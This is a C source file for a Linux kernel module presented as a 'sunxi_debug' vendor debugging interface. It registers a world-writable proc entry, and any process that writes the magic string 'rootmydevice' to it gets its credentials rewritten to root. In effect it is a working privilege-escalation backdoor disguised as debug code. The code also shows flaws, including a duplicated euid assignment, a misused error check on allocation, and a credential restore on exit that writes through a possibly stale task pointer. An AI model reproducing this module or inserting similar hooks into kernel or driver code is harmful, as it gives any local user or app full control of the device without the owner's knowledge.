#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/export.h>
#include <linux/kthread.h>
#include <linux/module.h>

#include <linux/debugfs.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>

#include <linux/slab.h>
#include "test.h"

static struct proc_dir_entry *proc_root;
static struct proc_dir_entry * proc_su;
static struct cred *cred_back;
static struct task_struct *task;

static ssize_t sunxi_proc_su_write(struct file *file, const char __user *buffer,size_t count, loff_t *data)
{
    char *buf;
    struct cred *cred;

    if (count < 1)
        return -EINVAL;

    buf = kmalloc(count, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    if (copy_from_user(buf, buffer, count)) {
        kfree(buf);
        return -EFAULT;
    }

    if(!strncmp("rootmydevice",(char*)buf,12)){
        task = current;
        cred = (struct cred *)__task_cred(task);
        memcpy(cred_back, cred, sizeof(struct cred));

        cred->uid = GLOBAL_ROOT_UID;
        cred->gid = GLOBAL_ROOT_GID;
        cred->suid = GLOBAL_ROOT_UID;
        cred->euid = GLOBAL_ROOT_UID;
        cred->euid = GLOBAL_ROOT_UID;
        cred->egid = GLOBAL_ROOT_GID;
        cred->fsuid = GLOBAL_ROOT_UID;
        cred->fsgid = GLOBAL_ROOT_GID;
        printk("now you are root\n");
    }

    kfree(buf);
    return count;
}


ssize_t sunxi_proc_su_read(struct file *file, char __user *buf, size_t size, loff_t *ppos)
{
	print();
    printk("sunxi debug: rootmydevice\n");
    return 0;
}

static int sunxi_proc_su_open(struct inode *inode, struct file *file)
{
    return 0;
}

static const struct file_operations proc_fops = {
    .open= sunxi_proc_su_open,
    .read= sunxi_proc_su_read,
    .write = sunxi_proc_su_write,
};

static int sunxi_root_procfs_attach(void)
{
    proc_root = proc_mkdir("sunxi_debug", NULL);
    proc_su= proc_create("sunxi_debug", 0666, proc_root, &proc_fops);
    if (IS_ERR(proc_su)){
        printk("create sunxi_debug dir error\n");
        return -1;
    }
    return 0;

}

static int __init sunxi_debug_init(void)
{
    int ret;

    cred_back = kmalloc(sizeof(struct cred), GFP_KERNEL);
    if (IS_ERR(cred_back))
        return PTR_ERR(cred_back);

    ret = sunxi_root_procfs_attach();
    printk("===fe3o4==== sunxi_root_procfs_attach ret:%d\n", ret);
    if(ret){
        printk("===fe3o4== sunxi_root_procfs_attach failed===\n ");
    }
    return 0;
}

static void __exit sunxi_debug_exit(void)
{
    struct cred *cred = (struct cred *)__task_cred(task);
    memcpy(cred, cred_back, sizeof(struct cred));
    kfree(cred_back);

    remove_proc_entry("sunxi_debug", proc_root);
    remove_proc_entry("sunxi_debug", NULL);
}

module_init(sunxi_debug_init);
module_exit(sunxi_debug_exit);
MODULE_LICENSE("GPL");
